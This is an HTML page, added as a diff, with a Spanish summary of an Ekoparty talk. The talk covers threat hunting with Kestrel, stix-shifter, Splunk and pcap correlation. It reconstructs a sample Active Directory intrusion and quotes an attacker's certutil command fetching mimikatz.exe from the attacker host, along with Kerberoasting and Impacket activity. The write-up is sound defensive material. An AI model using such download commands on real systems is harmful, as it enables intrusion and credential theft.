@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Kestrel y stix-shifter: correlación de logs y threat hunting a costo cero — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="index.html">Índice</a>
+<a class="nz-navbar__link" href="cat/ekoparty.html">Ekoparty</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · Ekoparty</p>
+<h1 class="nz-h2">Kestrel y stix-shifter: correlación de logs y threat hunting a costo cero</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: <a class="nz-link" href="https://youtu.be/i57jcT770TA">«Kestrel Sivar Version: Weaponizing stix-shifter for log correlation and threat hunting- D. Benavides»</a> · ver el <a class="nz-link" href="https://youtu.be/i57jcT770TA">video original</a></p>
+</header>
+<div class="nz-prose">
+<h2>Resumen</h2>
+<p>El threat hunting existe para encontrar lo que las alertas no atrapan: el analista parte de una hipótesis, la confronta contra los datos y sigue el hilo hasta reconstruir la intrusión completa. El problema práctico es que los datos viven dispersos —logs de endpoint en un SIEM, capturas de red en archivos pcap— y las plataformas que los correlacionan cuestan fortunas. Kestrel, el lenguaje de threat hunting open source de IBM, propone una salida elegante: consultas declarativas sobre entidades (procesos, conexiones, archivos) que se traducen automáticamente a las fuentes disponibles. Pero montar el stack original es engorroso, y ahí aparece stix-shifter, la librería Python que hace el trabajo pesado de traducción.</p>
+<p>Daniel Benavides, analista de seguridad y threat hunter peruano, tomó esa pieza y la convirtió en la base de una versión propia de bajo costo: un script en Python que integra stix-shifter con Splunk, añade el análisis de archivos pcap mediante IA y presenta los resultados en un formato digerible, con fecha, host, proceso, usuario y event ID. El costo de la plataforma entera: cero, con componentes open source.</p>
+<p>El recorrido con el que se demuestra: una intrusión completa reconstruida paso a paso sobre un dataset real —Kerberoasting con Rubeus, descargas de Mimikatz con certutil, movimiento lateral con herramientas de Impacket—, con la correlación Splunk + pcap revelando a cada paso lo que cada fuente por separado no mostraba.</p>
+<h2>El hunting como método: hipótesis primero, alertas después</h2>
+<p>El threat hunting no reemplaza al SOC: lo extiende. Mientras las alertas reaccionan a lo que ya se sabe detectar, el hunting proactivo trabaja con hipótesis sobre servicios y comportamientos que deberían verse en una red sana. El material de trabajo son los datasets: logs de endpoint recolectados con Sysmon —idealmente ya mapeados a técnicas de MITRE ATT&amp;CK— y capturas de red que guardan la conversación completa entre máquinas.</p>
+<p>El valor de esa combinación está en la correlación. Los logs dicen qué proceso corrió, con qué línea de comando y bajo qué usuario; el pcap dice con quién habló y cuánto tráfico generó. Ninguna de las dos fuentes por separado cuenta la historia completa, y una herramienta de hunting que no las cruce queda a medias.</p>
+<h2>Kestrel: un lenguaje para cazar</h2>
+<p>Kestrel es un proyecto open source de IBM presentado en Black Hat, con versión dockerizada disponible para quien quiera probarla. Su aporte central es un lenguaje declarativo de hunting: el analista escribe consultas sobre entidades —procesos, conexiones de red, archivos— encadenando operaciones como GET (traer entidades de una fuente), FIND (buscar relaciones entre entidades) y APPLY (aplicar analítica), construyendo un flujo de investigación con variables que se va refinando paso a paso.</p>
+<p>Debajo del lenguaje, el motor que hace posible interrogar fuentes heterogéneas es stix-shifter: una librería Python que traduce patrones STIX al lenguaje nativo de cada fuente de datos —Splunk, Elastic, QRadar y muchos más— y devuelve los resultados como objetos STIX estandarizados. Es la pieza que permite escribir la misma consulta contra un SIEM o contra cualquier otra fuente soportada.</p>
+<h2>La versión propia: un script, stix-shifter e IA</h2>
+<p>La versión original de Kestrel, montada en contenedores, resultó un dolor de cabeza al probarla. Investigando el proyecto apareció stix-shifter por debajo: una librería Python simple de usar, sin la maquinaria completa alrededor. Con ayuda de una IA, ese descubrimiento se convirtió en un script propio que:</p>
+<ul>
+<li>Consulta Splunk vía stix-shifter, con filtros por rango de tiempo.</li>
+<li>Analiza archivos pcap apoyándose en IA para el parseo.</li>
+<li>Correlaciona los resultados de ambas fuentes y presenta el resultado en un formato legible, con fecha, host, proceso, usuario y event ID.</li>
+<li>Sugiere los siguientes pasos de investigación a medida que aparecen hallazgos.</li>
+</ul>
+<p>La herramienta está en beta y todavía no está publicada; el enfoque general, en cambio, es replicable hoy con piezas open source.</p>
+<pre class="mermaid">
+flowchart LR
+    H[Analista de hunting] --> Q[Script Python con stix-shifter]
+    Q --> S[Logs Sysmon en Splunk]
+    Q --> P[Archivo pcap + IA de parseo]
+    S --> O[Objetos STIX correlacionados]
+    P --> O
+    O --> R[Informe: fecha, host, proceso, usuario, event ID + próximos pasos]
+
+</pre>
+
+<h2>La demostración: una intrusión completa bajo la lupa</h2>
+<p>El dataset de la demostración proviene de un ejercicio sobre una red de Milán: Splunk cargado con logs Sysmon —incluyendo las técnicas MITRE identificadas por evento— y un archivo pcap con el tráfico. El escenario: la máquina 2020 es el controlador de dominio (DC11503); hay máquinas infectadas con nombres de la saga Star Wars —la PCOB en 2025, la PC Anakin en 2030— y una dirección IP atacante, la 2010, inicialmente desconocida.</p>
+<p><strong>Primera hipótesis: servicios críticos de Active Directory.</strong> La caza arranca por los puertos que un dominio sano usa todo el tiempo: SMB (445), LDAP (389), Kerberos (88) y DNS (53). En Splunk aparece un <code>svchost.exe</code> abriendo conexión desde una máquina infectada hacia el controlador de dominio y, más grave, <code>rubeus.exe</code> corriendo desde una carpeta temporal dentro del propio DC. La correlación con el pcap añade la capa de red: paquetes DNS por UDP, y una IP nueva —la 2010— conectándose vía SMB 445, además de tráfico HTTP.</p>
+<p><strong>Caza por nombre de proceso.</strong> Buscar Rubeus en todas las fuentes revela la línea de comando exacta: <code>rubeus.exe kerberos</code> ejecutado con credenciales del usuario Obi —un Kerberoasting, el ataque que solicita tickets de servicio de cuentas para crackear sus contraseñas offline. Los eventos de Sysmon traen el mapeo MITRE incorporado: DLL side-loading, Windows Command Shell y AS-REP Roasting contra una cuenta de servicio SQL.</p>
+<p><strong>Caza por dirección IP.</strong> Buscar la 2010 en el pcap cuantifica el alcance: 7.052 paquetes SMB hacia el controlador de dominio y 410 paquetes HTTP. La caza por línea de comando y proceso completo el cuadro: <code>certutil.exe</code> descargando cargas útiles del atacante con <code>certutil -urlcache -f -split http://2010:8000/mimikatz.exe</code>, PowerShell bajando un <code>invoke.ps1</code> desde <code>2010:8000</code> vía <code>cmd.exe</code> —la evidencia de la descarga inicial del malware—, un <code>execute.bat</code> y un <code>whoami.exe</code> verificando contexto de usuario, típico de los primeros minutos de movimiento lateral.</p>
+<p><strong>Caza por cmd.exe y procesos padres.</strong> Filtrar todas las ejecuciones de <code>cmd.exe</code> —unas 65 coincidencias— destapa el resto de la cadena: movimiento lateral vía WMI, ejecución de <code>GetNPUsers.py</code> para enumerar usuarios y hacer AS-REP Roasting, y el detalle más fino: procesos padres con nombres aleatorios que cambian dinámicamente, como <code>ABIZTBQ0.exe</code> o <code>KFJPSJSTRAUZLPWB.exe</code>, la firma característica del framework Impacket y sus ejecuciones SMB remotas. Es el tipo de anomalía que sin Sysmon sería invisible. Mimikatz, entretanto, corrió desde la carpeta temporal del DC con las técnicas de masquerading y DLL side-loading como cobertura.</p>
+<pre class="mermaid">
+flowchart TD
+    A[Atacante 2010] -->|certutil / PowerShell: descarga de mimikatz.exe, rubeus.exe, invoke.ps1| B[Máquinas infectadas PCOB 2025 / PC Anakin 2030]
+    B -->|Rubeus: Kerberoasting con credenciales de Obi| C[Controlador de dominio DC11503]
+    B -->|Movimiento lateral: WMI + Impacket, padres con nombres aleatorios| C
+    C -->|Mimikatz desde carpeta temp + GetNPUsers.py| D[Credenciales de dominio comprometidas]
+
+</pre>
+
+<h2>Técnicas y herramientas mencionadas</h2>
+<ul>
+<li><strong>Kestrel</strong>: lenguaje open source de threat hunting de IBM, presentado en Black Hat y con versión dockerizada; define consultas GET/FIND/APPLY sobre entidades.</li>
+<li><strong>stix-shifter</strong>: librería Python que traduce patrones STIX al lenguaje nativo de cada fuente de datos y devuelve objetos STIX; motor de la integración.</li>
+<li><strong>Splunk</strong>: SIEM donde residen los logs Sysmon del dataset, consultado vía stix-shifter.</li>
+<li><strong>Sysmon</strong>: telemetría de endpoint de Windows; su parseo incluye mapeo a técnicas de MITRE ATT&amp;CK.</li>
+<li><strong>MITRE ATT&amp;CK</strong>: taxonomía de técnicas; en el dataset aparecen DLL side-loading, Windows Command Shell y AS-REP Roasting.</li>
+<li><strong>Rubeus</strong>: herramienta de ataques Kerberos; usada para Kerberoasting con credenciales del usuario Obi.</li>
+<li><strong>Kerberoasting y AS-REP Roasting</strong>: ataques de extracción y crackeo offline de credenciales de cuentas de servicio.</li>
+<li><strong>certutil</strong>: binario nativo de Windows abusado para descargar cargas útiles (<code>-urlcache</code>).</li>
+<li><strong>Mimikatz</strong>: herramienta de robo de credenciales, ejecutada desde la carpeta temporal del controlador de dominio.</li>
+<li><strong>Impacket</strong>: framework Python ofensivo; su firma son los procesos padres con nombres aleatorios dinámicos y herramientas como GetNPUsers.py.</li>
+<li><strong>WMI</strong>: vector de ejecución remota usado para el movimiento lateral.</li>
+<li><strong>Wireshark/pcap</strong>: capturas de red analizadas vía IA dentro del script; fuente de la correlación con los logs.</li>
+<li><strong>QRadar</strong>: fuente de datos soportada por stix-shifter, planteada en la consulta final como vía de centralización.</li>
+</ul>
+<h2>Conclusiones</h2>
+<ul>
+<li>El punto de partida importa menos que arrancar: no existe una metodología técnica rígida para el hunting; lo indispensable es la proactividad que va más allá de las alertas.</li>
+<li>Las alertas de baja severidad valen tanto como las críticas: los hilos que conducen a la intrusión completa a menudo empiezan en eventos que el triage ignora.</li>
+<li>Automatizar la correlación de logs no exige presupuestos grandes: stix-shifter, Splunk o cualquier fuente soportada, un archivo pcap y un script en Python alcanzan para construir una plataforma de costo cero con piezas open source.</li>
+<li>La técnica pesa tanto como la herramienta: la mejor plataforma con mal tuning y sin método devuelve resultados pobres. La IA acelera la construcción y el análisis, pero siempre con validación y pruebas humanas: el analista sabe qué salida necesita.</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de la charla <a class="nz-link" href="https://youtu.be/i57jcT770TA">«Kestrel Sivar Version: Weaponizing stix-shifter for log correlation and threat hunting- D. Benavides»</a>. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
